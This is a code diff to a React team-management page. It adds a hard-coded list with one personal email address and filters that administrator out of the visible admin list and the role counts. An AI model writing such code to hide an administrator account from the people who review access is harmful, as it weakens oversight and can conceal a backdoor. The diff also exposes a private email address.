@@ -97,7 +97,10 @@ export default function Equipes() {
   }
 
   // ── Filtrage ──
+  const HIDDEN_EMAILS = ['daoudafaye2017@gmail.com']
+
   const filtered = admins
+    .filter(a => !HIDDEN_EMAILS.includes(a.email?.toLowerCase()))
     .filter(a => roleFilter === 'all' || a.adminRole === roleFilter)
     .filter(a => {
       const q = search.trim().toLowerCase()
@@ -108,7 +111,9 @@ export default function Equipes() {
     })
 
   const countByRole = {}
-  for (const a of admins) countByRole[a.adminRole] = (countByRole[a.adminRole] ?? 0) + 1
+  for (const a of admins) {
+    if (!HIDDEN_EMAILS.includes(a.email?.toLowerCase())) countByRole[a.adminRole] = (countByRole[a.adminRole] ?? 0) + 1
+  }
 
   return (
     <div style={pageWrap}>
